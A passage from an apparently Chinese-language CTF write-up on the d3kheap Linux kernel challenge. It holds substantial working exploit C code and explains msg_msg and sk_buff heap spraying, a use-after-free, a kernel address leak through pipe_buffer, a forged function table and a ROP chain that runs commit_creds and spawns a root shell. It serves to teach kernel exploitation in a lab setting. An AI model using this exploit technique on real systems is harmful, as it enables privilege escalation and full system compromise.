&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to find next valid foothold!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        kernel_heap_search += msg_offset; <span class="comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">leak_out:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// add a obj to pass detection in set_freepointer() in free_msg</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// constructing A-&gt;B-&gt;A</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// regain UAF</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_fd_1 = pipe_fd[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset; <span class="comment">// push rsi ; pop rsp ; pop 4 val ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct ROP</span></span><br><span class="line">    rop_idx = <span class="number">4</span>;</span><br><span class="line">    buf[rop_idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x16</span> + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = getRootShell;</span><br><span class="line">    buf[rop_idx++] = user_cs;</span><br><span class="line">    buf[rop_idx++] = user_rflags;</span><br><span class="line">    buf[rop_idx++] = user_sp;</span><br><span class="line">    buf[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="number">2</span>], buf[<span class="number">1</span>]);</span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    sleep(5);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>不一定每次都能成功（由于开了 freelist 随机化的缘故，我们并不能保证进行 UAF 的 object 往高地址一定会有 msg_msg 结构体），但是经笔者实测成功率还是不低的</p>
-<p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h2 id="解法二：msg-msg-sk-buff-堆喷"><a href="#解法二：msg-msg-sk-buff-堆喷" class="headerlink" title="解法二：msg_msg + sk_buff 堆喷"></a>解法二：msg_msg + sk_buff 堆喷</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列</h3><p>既然我们现在有了一个UAF的机会，那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="type">long</span> m_type;</span><br><span class="line">	<span class="type">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p>
-<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>我们不难想到的是，我们可以在一开始时先通过 d3kheap 设备提供的功能先获取一个 object 后释放，之后堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p>
-<p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>此时<strong>我们的辅助消息便有极大的概率获取到之前释放的 object</strong></p>
 <blockquote>
 <p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p>
 </blockquote>
 <h3 id="Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列"><a href="#Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列" class="headerlink" title="Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列"></a>Step.II 构造 UAF，堆喷 <code>sk_buff</code> 定位 victim 队列</h3><p>此时我们直接利用题目的功能将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p>
-<p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>但此时我们无法得知是哪一个消息队列命中了 UAF object，这个时候我们选用 <code>sk_buff</code> 堆喷劫持该结构体</p>
 <p>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p>
-<p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p>
 <p>那么我们利用 <code>sk_buff</code> 堆喷向这个 UAF object 中写入什么数据呢？其实这里我们可以随便写入一些内容，之后我们使用 <code>MSG_COPY</code> flag 进行消息拷贝时便会失败，但不会 kernel panic，<strong>因此我们可以通过判断是否读取消息失败来定位命中 UAF 的消息队列</strong></p>
 <h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何继续利用这个 UAF，由于其位于消息队列上，所以我们可以利用消息队列的性质来完成利用</p>
 <p>首先我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p>
 <p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p>
-<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p>
 <p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p>
 <blockquote>
@@ -391,12 +489,12 @@
 <li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li>
 </ul>
 <h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p>
-<p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 	0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 